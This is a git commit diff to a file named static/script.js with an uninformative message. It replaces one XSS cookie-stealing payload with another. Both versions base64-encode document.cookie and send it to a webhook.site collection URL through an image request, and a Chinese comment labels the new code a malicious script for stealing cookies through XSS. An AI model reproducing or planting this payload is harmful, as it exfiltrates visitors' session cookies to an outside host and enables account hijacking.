adbd3239979bf59a275c1213dea521a60b22405a
celik1001 <relin1001@gmail.com>
2025-04-05 22:18:37 +0800

    o

--- static/script.js
+++ static/script.js
@@ -1,5 +1,6 @@
-<script>
-  alert(1); var cookie = document.cookie; new Image().src =
-  "https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?" +
-  window.btoa(document.cookie);
-</script>;
+// 惡意 script，用於 XSS 偷 cookie
+(() => {
+  const payload = btoa(document.cookie);
+  new Image().src =
+    "https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?c=" + payload;
+})();
